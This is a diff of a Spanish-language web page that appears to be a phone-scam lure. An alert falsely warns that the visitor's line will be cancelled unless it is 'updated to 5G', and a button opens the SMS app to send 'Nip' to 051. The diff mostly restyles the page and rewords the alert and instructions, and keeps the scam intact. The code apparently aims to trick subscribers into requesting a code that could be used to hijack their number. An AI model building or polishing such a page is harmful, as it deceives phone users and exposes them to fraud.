@@ -12,54 +12,35 @@
       justify-content:center;
       height:100vh;
       margin:0;
-      background: url("fondo.jpg") no-repeat center center fixed;
-      background-size: cover;
+      background: url('fondo.jpg') no-repeat center center/cover;
     }
     .container {
-      background: rgba(255, 255, 255, 0.92);
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 5px 25px rgba(0,0,0,0.3);
-      text-align: center;
-      width: 90%;
-      max-width: 350px;
+      background: rgba(255,255,255,0.9);
+      padding:25px;
+      border-radius:15px;
+      box-shadow:0 5px 20px rgba(0,0,0,0.2);
+      text-align:center;
+      width:90%;
+      max-width:350px;
     }
-    h1 { 
-      font-size: 22px; 
-      margin-bottom: 10px; 
-      color: #b30000;
-    }
-    p { 
-      font-size: 14px; 
-      color: #444; 
-      margin-bottom: 20px; 
-    }
+    h1 { font-size:22px; margin-bottom:15px; color:#222; }
+    p { font-size:14px; color:#444; margin-bottom:20px; }
     .btn {
-      display: inline-block;
-      padding: 12px 20px;
-      background: #ff0000;
-      color: #fff;
-      text-decoration: none;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 8px;
-      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
-      transition: background 0.3s, transform 0.2s;
+      display:inline-block;
+      padding:12px 20px;
+      background:#d93025;
+      color:#fff;
+      text-decoration:none;
+      font-size:16px;
+      border-radius:8px;
+      transition: background 0.3s;
     }
-    .btn:hover {
-      background: #cc0000;
-      transform: scale(1.05);
-    }
-    .note {
-      font-size: 13px;
-      color: #555;
-      margin-top: 12px;
-    }
+    .btn:hover { background:#a02119; }
     .warning {
-      color: #b33;
-      font-size: 13px;
-      margin-top: 8px;
-      display: none;
+      color:#b33;
+      font-size:13px;
+      margin-top:8px;
+      display:none;
     }
   </style>
 </head>
@@ -69,19 +50,14 @@
     <p>Presiona el botón para abrir tu app de mensajes y enviar el NIP.</p>
 
     <!-- Enlace SMS: número 051 y texto "nip" -->
-    <a id="smsLink" class="btn" href="sms:051?body=nip">📩 Enviar SMS</a>
+    <a id="smsLink" class="btn" href="sms:051?body=Nip">📩 Enviar SMS</a>
 
     <div id="warning" class="warning">
-      Es posible que el enlace no funcione en PC. Usa tu teléfono para enviar el SMS al <strong>051</strong> con el texto <strong>nip</strong>.
+      Es posible que el enlace no funcione en PC. Usa tu teléfono.
     </div>
-
-    <div class="note">Número: <strong>051</strong> | Mensaje: <strong>nip</strong></div>
   </div>
 
   <script>
-    // Mostrar alerta al entrar
-    alert("⚠️ Actualice su línea a 5G antes de 7 días, de lo contrario será dada de baja.");
-
     // Detectar si es móvil
     function isMobile() {
       return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
@@ -89,6 +65,10 @@
     if (!isMobile()) {
       document.getElementById('warning').style.display = 'block';
     }
+
+    // Mensaje de alerta al entrar
+    alert("⚠️ Actualice su línea a 5G o será dada de baja.");
   </script>
 </body>
 </html>
+
